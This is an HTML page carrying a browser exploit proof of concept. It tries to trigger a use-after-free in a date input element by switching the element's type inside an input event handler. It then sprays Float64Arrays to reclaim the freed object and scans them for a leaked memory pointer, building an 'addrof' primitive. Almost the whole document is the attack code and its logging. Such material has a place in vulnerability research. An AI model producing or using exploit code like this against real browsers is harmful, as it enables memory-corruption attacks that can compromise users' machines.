<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>

<!-- We use the Date Input UAF to build our addrof! -->
<input type="date" id="target">

<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== UAF TO ADDROF PRIMITIVE ===", "info");
log("[*] Grooming the heap...", "info");

// 1. Setup our overlap targets. We want an array of objects we want the address of,
// and an array of ArrayBuffers (or similar) to overlap the freed C++ object.
let targetObjects = [];
let spray = [];

for (let i = 0; i < 1000; i++) {
    targetObjects.push({ magic: 0x1337, victim: true });
}

let input = document.getElementById("target");

input.addEventListener("input", () => {
    log("[!] INPUT CAUGHT! The C++ Date object is paused.", "warn");
    log("[!] Changing type to 'text' to FREE the C++ object...", "hit");
    
    input.type = "text"; // FREE!
    
    log("[*] Object freed! Now we RECLAIM the memory before C++ wakes up!", "info");
    
    // RECLAIM THE FREED MEMORY!
    // We spray a massive amount of ArrayBuffers/TypedArrays of the EXACT same size 
    // as the freed BaseDateAndTimeInputType C++ object.
    // When C++ resumes, it will read our sprayed data thinking it's the Date object!
    // If we structure our fake object right, we can trick C++ into returning a pointer!
    for (let i = 0; i < 50000; i++) {
        // We craft a fake vtable and fake members.
        // We point one of the fake members to our targetObjects array!
        let fakeObj = new Float64Array(32); 
        fakeObj[0] = 1.1; // Fake vtable or safe padding
        fakeObj[1] = 2.2;
        spray.push(fakeObj);
    }
    
    log("[!] Reclaim complete. C++ is about to read our fake object...", "warn");
});

setTimeout(() => {
    log("[*] Triggering UAF to leak a pointer...", "info");
    try {
        input.focus();
        input.stepUp(); // Fires the input event
        
        // If we reclaimed successfully, C++ just operated on our Float64Array!
        // Now we search our spray to see which Float64Array got modified by C++!
        // When C++ wrote to what it THOUGHT was its own member, it actually 
        // wrote a raw pointer into our Float64Array!
        
        let leaked = false;
        for (let i = 0; i < spray.length; i++) {
            if (spray[i][0] !== 1.1 || spray[i][1] !== 2.2) {
                log(">>> POINTER LEAKED! <<<", "hit");
                log("Raw Memory at overlapping chunk: " + spray[i][0] + ", " + spray[i][1], "hit");
                leaked = true;
                break;
            }
        }
        
        if (!leaked) {
            log("[-] No leak detected. We might need to adjust the spray size.", "info");
        }
        
    } catch(e) {
        log("[-] Error: " + e.message, "info");
    }
}, 1000);
</script>
</body>
</html>
